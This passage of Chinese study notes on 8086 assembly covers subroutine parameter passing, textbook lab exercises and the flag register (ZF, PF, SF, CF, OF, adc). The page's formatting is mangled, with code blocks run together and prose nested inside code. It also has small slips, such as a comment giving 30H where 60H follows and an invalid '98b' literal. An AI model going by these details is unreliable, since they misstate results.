ret</span><br></pre></td></tr></table></figure></li></ul></li><li><p>要做好注释</p></li><li><p>用寄存器来存储参数和结果是最常使用的方法。对于存放参数的寄存器和存放结果的寄存器，调用者和子程序的读写操作恰恰相反</p><ul><li>调用者将参数送入参数寄存器，从结果寄存器中取到返回值;</li><li>子程序从参数寄存器中取到参数，将返回值送入结果寄存器。</li></ul></li></ul><h3 id="10-11-批量数据的传递"><a href="#10-11-批量数据的传递" class="headerlink" title="10.11 批量数据的传递"></a>10.11 批量数据的传递</h3><ul><li><p>一个子程序中，如果有一个，两个参数可以用寄存器存放，但是如果要传递参数有很多怎么办</p></li><li><p>寄存器的数量终究有限，我们不可能简单地用寄存器来存放多个需要传递的数据。对于返回值，也有同样的问题。</p></li><li><p>在这种时候，我们将批量数据放到内存中，然后将它们所在内存空间的首地址放在寄存器中，传递给需要的子程序。</p></li><li><p>对于具有批量数据的返回结里，也可用同样的方法。</p></li><li><p>注意：除了寄存器，内存传递参数外，还有一种通用的方法使用栈来传递参数</p></li></ul><h3 id="10-12-寄存器冲突的问题"><a href="#10-12-寄存器冲突的问题" class="headerlink" title="10.12 寄存器冲突的问题"></a>10.12 寄存器冲突的问题</h3><ul><li>设计一个子程序，功能:将一个全是字母，以0结尾的字符串，转化为大写</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">data segment </span><br><span class="line">db &#x27;asdfghhjk&#x27;</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,0</span><br><span class="line">call bdx</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">bdx:mov cl,[si]</span><br><span class="line">mov ch,0</span><br><span class="line">jcxz s</span><br><span class="line">and byte ptr [si],11011111b</span><br><span class="line">inc si</span><br><span class="line">jmp bdx</span><br><span class="line">s:  ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><ol><li><p>debug调试，查看原数据段</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240726115423284.png" alt="image-20240726115423284"></p></li><li><p>查看运行后的数据段内存</p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240726115728275.png" alt="image-20240726115728275"></p></li></ol><ul><li>如果是多个字符串呢</li></ul><ol><li><pre><code>assume cs:codedata segment db &#39;asdfghhjk&#39;,0db &#39;asdfghhjk&#39;,0db &#39;asdfghhjk&#39;,0db &#39;asdfghhjk&#39;,0data endscode segmentstart:                mov ax,data        mov ds,ax        mov si,0        mov bx,0        mov cx,4        call bdx                mov ax,4c00h        int 21h    bdx:push cx    s0: mov cl,[si]        mov ch,0        jcxz s        and byte ptr [si],11011111b        inc si        jmp short s0    s:    pop cx        inc si        loop bdx        ret      code endsend start<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">2. 编译连接，debug调试，查看原始数据段![image-20240726121144937](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240726121144937.png)</span><br><span class="line"></span><br><span class="line">3. 查看运行结束后的数据段![image-20240726121842386](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240726121842386.png)</span><br><span class="line"></span><br><span class="line">### **实验十**</span><br><span class="line"></span><br><span class="line">**实验一：显示字符串**</span><br><span class="line"></span><br><span class="line">![image-20240726142905838](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240726142905838.png)</span><br><span class="line"></span><br><span class="line">![image-20240726142931140](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240726142931140.png)</span><br><span class="line"></span><br><span class="line">1. 代码</span><br><span class="line"></span><br></pre></td></tr></table></figure></code></pre></li></ol><p>assume cs:code<br>data segment<br>db ‘Welcome to masm!’,0<br>data ends<br>code segment<br>start: mov dh,3<br> mov dl,1<br>   mov cl,2<br> mov ax,data<br>   mov ds,ax<br> mov si,0<br> call show_str<br><br> mov ax,4c00h<br> int 21h<br><br>show_str:mov ax,cx<br> mov cl,[si]<br> mov ch,0<br> jcxz s<br> mov cx,ax<br> push dx<br> mov bx,dx<br> mov ax,0B800h<br> mov es,ax<br> mov dl,dh<br> mov dh,0<br> mov ax,0A0h<br> mul dx<br>     mov bh,0<br> add ax,bx<br> add ax,bx<br> mov bx,ax<br> mov al,[si]<br> mov ah,cl<br> mov di,si<br> add di,di<br> mov es:[bx+di],ax<br> inc si<br> pop dx<br> jmp show_str<br>s:   ret<br><br>code ends<br>end start</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. ![image-20240726164025985](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240726164025985.png)</span><br><span class="line"></span><br><span class="line">3. ```</span><br><span class="line">   mov dh,15</span><br><span class="line">   mov dl,6</span><br><span class="line">   mov cl,2</span><br></pre></td></tr></table></figure><p>   <img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240726162817240.png" alt="image-20240726162817240"></p><p><strong>实验二：解决除法溢出的问题</strong></p><ol><li><p>代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">da segment </span><br><span class="line">db 16 dup(0)</span><br><span class="line">da ends</span><br><span class="line">code segment</span><br><span class="line">start: mov ax,4240h;低位</span><br><span class="line"> mov dx,000fh;高位</span><br><span class="line">   mov cx,0ah</span><br><span class="line"> call divdw</span><br><span class="line"></span><br><span class="line"> mov ax,4c00h</span><br><span class="line"> int 21h</span><br><span class="line"></span><br><span class="line">divdw:   push ax</span><br><span class="line"> mov ax,da</span><br><span class="line"> mov ds,ax</span><br><span class="line"> pop ax</span><br><span class="line"> mov bx,ax</span><br><span class="line"> mov ax,dx</span><br><span class="line"> mov dx,0;此时bx是低位，ax是高位，dx=0</span><br><span class="line"> div cx  </span><br><span class="line"> ;此时ax是int，dx是rem，bx是低位</span><br><span class="line"> </span><br><span class="line"> push ax</span><br><span class="line"> push bx</span><br><span class="line"> push dx</span><br><span class="line"> mov ax,dx</span><br><span class="line"> mov bx,0ffffh</span><br><span class="line"> mul bx  ;这时是进行rem的乘法， </span><br><span class="line"> pop dx</span><br><span class="line"> add ax,dx</span><br><span class="line"> pop bx</span><br><span class="line"> add ax,bx;进行加L操作</span><br><span class="line"> div cx</span><br><span class="line"> mov cx,ax ;cx这时是加号右边的结果</span><br><span class="line"> pop ax</span><br><span class="line"> mov dx,ax</span><br><span class="line"> push dx</span><br><span class="line"> mov bx,0ffffh</span><br><span class="line"> mul bx</span><br><span class="line"> mov ds:[0],ax</span><br><span class="line"> mov ds:[2],dx</span><br><span class="line"> pop dx</span><br><span class="line"> adc ds:[0],dx</span><br><span class="line"> mov ax,0</span><br><span class="line"> adc ds:[2],ax</span><br><span class="line"> adc ds:[0],cx</span><br><span class="line"> mov ax,ds:[0]</span><br><span class="line"> mov dx,ds:[2]</span><br><span class="line"> ret</span><br><span class="line"> </span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></li><li><p>结果</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240726195657645.png" alt="image-20240726195657645"></p></li><li><pre><code>adc指令ADC 指令在汇编语言中用于执行加法操作时处理进位（carry）。ADC 指令的全称是“Add with Carry”（带进位加法）。它不仅将两个操作数相加，还将前一个加法操作中的进位标志（carry flag）也加到结果中。ADC destination, sourcedestination: 目标操作数，通常是一个寄存器或内存位置。source: 源操作数，通常是一个立即数、寄存器或内存位置。加法操作: ADC 指令首先执行加法操作，即将 destination 和 source 相加。进位处理: 它还加上进位标志（Carry Flag，CF）的值。进位标志是前一个加法操作的结果。如果前一个加法操作产生了进位，ADC 会将这个进位加到当前的加法操作中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">**实验三：数值显示**</span><br><span class="line"></span><br><span class="line">1. 代码</span><br><span class="line"></span><br></pre></td></tr></table></figure>assume cs:codedata segmentdb 10 dup(0)data endscode segmentstart:  mov ax,12666        mov bx,data        mov ds,bx        mov si,0        call dtoc        mov dh,8        mov dl,3        mov cl,2        call show_str                mov ax,4c00h        int 21h        dtoc:    mov cx,10         mov dx,0        div cx        mov bl,dl        mov bh,0        mov cx,bx        jcxz cz        add bl,30H        push bx        inc di        jmp dtoccz:     mov ax,data        mov ds,ax        mov cx,di    s0: pop ds:[si]        inc si        loop s0        mov si,0        ret        show_str:mov ax,cx         mov cl,[si]         mov ch,0         jcxz s         mov cx,ax         push dx         mov bx,dx         mov ax,0B800h         mov es,ax         mov dl,dh         mov dh,0         mov ax,0A0h         mul dx         mov bh,0         add ax,bx         add ax,bx         mov bx,ax         mov al,[si]         mov ah,cl         mov di,si         add di,di         mov es:[bx+di],ax         inc si         pop dx         jmp show_str    s:   retcode endsend start <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">2. 结果</span><br><span class="line"></span><br><span class="line">   ![image-20240726213123243](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240726213123243.png)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">## 11 标志寄存器</span><br><span class="line"></span><br><span class="line">* 8086CPU的标志寄存器有16位，其中存储的信息通常被称为程序状态字(PSW)</span><br><span class="line"></span><br><span class="line">* 我们已经使用过8086CPU的ax、bx、cx、dx、si、di、bp、sp、ip、cs、ss、ds、es等13个寄存器了。</span><br><span class="line"></span><br><span class="line">* flag 和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。</span><br><span class="line"></span><br><span class="line">* 而flag寄存器是按位起作用的，也就是说，它的每一位都有专门的含义，记录特定的信息。</span><br><span class="line"></span><br><span class="line">* 8086cpu的flag寄存器的结构</span><br><span class="line"></span><br><span class="line">  ![image-20240726225843589](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240726225843589.png)</span><br><span class="line"></span><br><span class="line">* flag的1、3、5、12、13、14、15位在8086CPU中没有使用，不具有任何含义。而0、2、4、6、7、8、9、10、11位都具有特殊的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 11.1 ZF标志</span><br><span class="line"></span><br><span class="line">* flag的第6位是ZF，零标志位。</span><br><span class="line">  它记录相关指令执行后，</span><br><span class="line"></span><br><span class="line">  * 结果为0，ZF=1</span><br><span class="line">  * 结果不为0，ZF=0</span><br><span class="line"></span><br><span class="line">  **例如：**</span><br><span class="line"></span><br></pre></td></tr></table></figure></code></pre></li></ol><p>  mov ax,1<br>  sub ax,1<br>  指令执行后，结果为0，则ZF&#x3D;1</p><p>  mov ax,2<br>  sub ax,1<br>  指令执行后，结果为1，则ZF&#x3D;0<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">* 对于ZF的值，我们可以这样来看，ZF标记相关指令的计算结果是否为0，如果为0，则在ZF要记录下“是0”这样的肯定信息。</span><br><span class="line"></span><br><span class="line">  指令：</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>  mov ax,1<br>  and ax,0<br>  执行后，结果为0，则ZF&#x3D;1，表示“结果是0”</p><p>  mov ax,1<br>  or ax,0<br>  执行后，结果不为0，则ZF&#x3D;0，表示“结果非0”<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">* **注意：**</span><br><span class="line"></span><br><span class="line">  在8086CPU的指令集中，有的指会的执行是影响标志寄存器的，比如:`add、sub、mul、div、inc、or、and`等，它们大都是运算指令(进行逻辑或算术运算)</span><br><span class="line"></span><br><span class="line">  有的指会的执行对标志寄存器没有影响，比如:`mov、push、pop`等，它们大都是传送指令</span><br><span class="line"></span><br><span class="line">* 我们在使用一条指会的时候，要注意这条指会的全部功能，其中包括，执行结果对标记寄存器的哪些标志位造成影响。</span><br><span class="line"></span><br><span class="line">### 11.2 PF标志</span><br><span class="line"></span><br><span class="line">* flag的第2位是PF，奇偶标志位。</span><br><span class="line">  它记录指令执行后，结果的所有二进制位中1的个数:</span><br><span class="line"></span><br><span class="line">  * 为偶数，PF=1</span><br><span class="line">  * 为奇数，PF=0</span><br><span class="line"></span><br><span class="line">  **例如**：</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>  mov al,1<br>  add al,10<br>  执行后，结果为00001011B，其中有3(奇数)个1，则PF&#x3D;0</p><p>  mov al,1<br>  or al,10<br>  执行后，结果为00000011B，其中有2(偶数)个1，则PF&#x3D;1<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 11.3 SF标志</span><br><span class="line"></span><br><span class="line">* flag的第7位是SF，符号标志位</span><br><span class="line"></span><br><span class="line">  他记录指令执行后</span><br><span class="line"></span><br><span class="line">  * 结果为负，SF=1</span><br><span class="line">  * 结果为正，SF=0</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>有符号数与补码</p><ul><li><p>计算机中通常用补码来麦示有符号数据。计算机中的一个数据可以看作是有符号数，也可以看成是无符号数</p><p>如：</p><p>  00000001B，以者作为无符号数1，或有，符号数+1<br>  10000001B，可以看作为无符号数129，也可以看作有符号数-127。</p></li><li><p>这也就是说，对于同一个二进制数据，计算机可以将它当作无符号数据来运算，也可以当作有符号数据来运算</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 示例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  mov al,10000001B<br>  add al,1<br>  结果:(al)&#x3D;10000010B<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  * 我们可以将add指令进行的运当作无符号数的运那么add指令相当于计算129+1，结果为130</span><br><span class="line">    (10000010B)</span><br><span class="line">  * 也可以将add指会进行的运算当作有符号数的运算，那么add指令相当于计算-127+1，结果为-126</span><br><span class="line">    (10000010B)</span><br><span class="line"></span><br><span class="line">* 不管我们如何看待，CPU 在执行add等指会的时候就已经包含了两种含义，也将得到用同一种信息来记录的两种结果。</span><br><span class="line"></span><br><span class="line">* **关键在于我们需要哪一种结果**</span><br><span class="line"></span><br><span class="line">* SF 标志，就是CPU对有符号数运算结果的一种记录，它记录数据的正负。</span><br><span class="line">  在我们将数据当作有符号数来运算的时候，可以通过它来得知结果的正负</span><br><span class="line"></span><br><span class="line">* 如果我们将数据当作无符号数来运算，SF的值则没有意义，虽然相关的指令影响了它的值。</span><br><span class="line"></span><br><span class="line">* CPU在执行 add 等指令时，是必然要影响到SF标志位的值的。</span><br><span class="line"></span><br><span class="line">* 我们再来看那个例子</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>  mov al,10000001B<br>  add al,1<br>  结果:(al)&#x3D;10000010B，SF&#x3D;1<br>  表示：如果指会进行的是有符号数运算，那么结果为负，如果是无符号数运算不用管他</p><p>  moy al,10000001B<br>  add al,01111111B<br>  执行后，结果为0，SF&#x3D;0<br>  表示:如果指令进行的是有符号数运，那么结果为非负。<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">* 某次指会将影响标志寄存器中的多个标志位，这些被影响的标记位比较全面地记录了指令的执行结果，为相关的处理提供了所需的依据 </span><br><span class="line">* 如执行 `sub al,al`执行后，ZF，PF，SF等标志位都要受到影响，ZF=1，PF=1，SF=0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 11.4 CF标志</span><br><span class="line"></span><br><span class="line">* flag的第0位是CF，进位标志位</span><br><span class="line"></span><br><span class="line">* 一般情况下，在进行无符号数运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值。</span><br><span class="line"></span><br><span class="line">* 对于位数为N的无符号数来说，其对应的二进制信息的最高位，即第N-1位，的最高有效位，而假想存在的第N位，就是相对于最高有效位的更高位。</span><br><span class="line"></span><br><span class="line">* ![image-20240727140615518](C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240727140615518.png)</span><br><span class="line"></span><br><span class="line">  当两个数据相加的时候，有可能产生从最高有效位向更高位的进位。</span><br><span class="line">  比如，两个8 位数据:98H+98H，将产生进位。由于这个进位值在8位数中无法保存，我们在前面的课程中，就只是简单地说这个进位值丢失了</span><br><span class="line"></span><br><span class="line">* 其实CPU在运算的时候，并不丢弃这个进位值，而是记录在一个特殊的寄存器的某一位上:</span><br><span class="line">* 8086CPU 就用flag的CF位来记录这个进位值。</span><br><span class="line"></span><br><span class="line">* debug看到的信息</span><br><span class="line"></span><br><span class="line">  ![image-20240727141042541](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240727141042541.png)</span><br><span class="line"></span><br><span class="line">* **比如：**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>  mov al,98H<br>  add al,al  ;执行后:(al)&#x3D;30H，CF&#x3D;1，<br>     ;CF记录了最高有效位向更高位的进位值<br>  add al,al  ;执行后:(al)&#x3D;30H，CF&#x3D;0<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  **上机：**</span><br><span class="line"></span><br><span class="line">  ![image-20240727141549850](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240727141549850.png)</span><br><span class="line"></span><br><span class="line">  ![image-20240727141737306](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240727141737306.png)</span><br><span class="line"></span><br><span class="line">  我们发现在第一个add后，NC变为了CY，因为是98H+98H=130H，产生了进位，而第二次add，CY变为NC，因为30H+30H=60H没有产生进位</span><br><span class="line"></span><br><span class="line">* 另外一种情况，而当两个数据做减法的时候，有可能向更高位借位。</span><br><span class="line"></span><br><span class="line">  **比如**：</span><br><span class="line"></span><br><span class="line">  两个8位数据:97H-98H，将产生借位，借位后，相当于计算197H-98H。</span><br><span class="line">  而flag的CF位也可以用来记录这个借位值。</span><br><span class="line"></span><br><span class="line">  **上机：**</span><br><span class="line"></span><br><span class="line">  ![image-20240727142502358](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240727142502358.png)</span><br><span class="line"></span><br><span class="line">  ![image-20240727142614159](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240727142614159.png)</span><br><span class="line"></span><br><span class="line">  FF：相当于补码的-1，我们发现在第一次sub的时候NC变为CY，第二次则变回NC</span><br><span class="line"></span><br><span class="line">### 11.5 OF标志</span><br><span class="line"></span><br><span class="line">* 在进行有符号数运算的时候，如结果超过了机器所能表示的范围称为溢出</span><br><span class="line"></span><br><span class="line">* 那么，什么是机器所能表示的范围呢?</span><br><span class="line"></span><br><span class="line">  比如:add al,3，那么对于8位的有符号数据，机器所能表示的范围就是-128~127。</span><br><span class="line"></span><br><span class="line">* 如果运算结果超出了机器所能表达的范围，将产生溢出。</span><br><span class="line">* 注意，这里所讲的溢出，只是对有符号数运算而言。(就像进位只是相对于无符号数而言!)</span><br><span class="line"></span><br><span class="line">* **示例**</span><br><span class="line"></span><br><span class="line">  ![image-20240727143313821](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240727143313821.png)</span><br><span class="line"></span><br><span class="line">  ![image-20240727143458650](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240727143458650.png)</span><br><span class="line"></span><br><span class="line">  我们发现NV变为OV，说明发生了溢出，结果侵犯了符号位</span><br><span class="line"></span><br><span class="line">  ![image-20240727143753714](C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240727143753714.png)</span><br><span class="line"></span><br><span class="line">  ![image-20240727143840350](C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240727143840350.png)</span><br><span class="line"></span><br><span class="line">  当成无符号数的话，进位标志位，产生了进位，而当成有符号数来看的话，溢出标志位产生了溢出</span><br><span class="line"></span><br><span class="line">* 如果在进行有符号数运算时发生溢出，那么运算的结里将不正确。</span><br><span class="line">  就上面的两个例子来说:</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>  mov al,98<br>  add al,99<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  add指会运算的结果是(a1)=0C5H，因为进行的是有符号数运算，所以 al中存储的是有符号数，而0C5H是有符号数-59的补码。</span><br><span class="line"></span><br><span class="line">  ![image-20240727144524938](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240727144524938.png)</span><br><span class="line"></span><br><span class="line">  如果我们用add 指令进行的是有符号数运算，则98+99=-59这样的结果让人无法接受。</span><br><span class="line"></span><br><span class="line">  造成这种情况的原因，就是实际的结果 197，作为一个有符号数，在8位寄存器al中存放不下</span><br><span class="line"></span><br><span class="line">* 由于在进行有符号数运算时，可能发生溢出而造成结果的错误。所以CPU需要对指令执行后是否产生溢出进行记录。因此有了OF</span><br><span class="line"></span><br><span class="line">* CF和OF的区别</span><br><span class="line">  * CF是对无符号数运算有意义的标志位</span><br><span class="line">  * OF是对有符号数运算有意义的标志位</span><br><span class="line"></span><br><span class="line">* 对于无符号数运算，CPU用CF位来记录是否产生了进位</span><br><span class="line">* 对于有符号数运算，CPU 用 OF 位来记录是否产生了溢出</span><br><span class="line"></span><br><span class="line">* SF位来记录结果的符号</span><br><span class="line"></span><br><span class="line">* 对于有无符号，计算机是分不清楚状况的，因此他必须两种都记载着，要怎么用，看的是你当他是什么</span><br><span class="line"></span><br><span class="line">* ```</span><br><span class="line">  mov al,98b</span><br><span class="line">  add al,99b</span><br></pre></td></tr></table></figure></p><ul><li>对于无符号数运算，98+99没有进位，CF&#x3D;0</li><li>对于有符号数运算，98+99发生溢出，OF&#x3D;1</li></ul><h3 id="11-6-adc指令"><a href="#11-6-adc指令" class="headerlink" title="11.6 adc指令"></a>11.6 adc指令</h3><ul><li><p>adc是带进位加法指令，它利用了CF位上记录的进位值。</p><ul><li>格式: <code>adc 操作对象1,操作对象2</code></li><li>功能:<br>操作对象1&#x3D;操作对象1+操作对象2+CF</li><li>比如:<code>adc ax,bx</code> 实现的功能是:<br>(ax)&#x3D;(ax)+(bx)+CF</li></ul></li><li><p><strong>示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 